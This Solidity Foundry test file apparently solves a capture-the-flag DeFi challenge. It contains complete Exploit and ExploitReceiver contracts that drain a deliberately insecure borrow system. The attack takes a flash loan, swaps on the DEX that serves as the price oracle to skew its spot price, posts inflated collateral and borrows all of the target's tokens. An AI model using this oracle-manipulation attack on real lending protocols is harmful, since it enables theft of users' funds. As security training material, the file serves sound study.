// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";


contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {

        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));
        
        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(address(oracleDex), address(token0), address(token1));

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");

    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        ExploitReceiver eReceiver = new ExploitReceiver();
        Exploit e = new Exploit(
            address(target),
            address(oracleDex)
        );

        flashLoanPool.flashLoan(
            address(eReceiver),
            abi.encodeWithSignature(
                "troll(address,address)", address(e), address(token0)
            )
        );

        //============================//

        vm.stopPrank();

        assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");

    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/


contract ExploitReceiver {
    function troll(address exploit, address token) external {
        IERC20(token).transfer(exploit, IERC20(token).balanceOf(address(this)));
        
        Exploit(exploit).hack();
    }
}

contract Exploit {
    IERC20 token0;
    IERC20 token1;
    BorrowSystemInsecureOracle borrowSystem;
    InsecureDexLP dex;
    address player;

    constructor(address _borrowSystem, address _dex) {
        player = msg.sender;
        borrowSystem = BorrowSystemInsecureOracle(_borrowSystem);
        
        dex = InsecureDexLP(_dex);
        token0 = IERC20(dex.token0());
        token1 = IERC20(dex.token1());

        token0.approve(_borrowSystem, type(uint256).max);
        token1.approve(_borrowSystem, type(uint256).max);

        token0.approve(_dex, type(uint256).max);
        token1.approve(_dex, type(uint256).max);
    }

    function hack() external {
        address flashLoan = msg.sender;
        uint256 _balance = token0.balanceOf(address(this));

        uint256 _amountToken1 = dex.swap(address(token0), address(token1), 8000 ether);
        
        borrowSystem.depositToken1(_amountToken1);
        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem)));
                                    
        token0.transfer(flashLoan, _balance);

        token0.transfer(player, token0.balanceOf(address(this)));
    }
    
}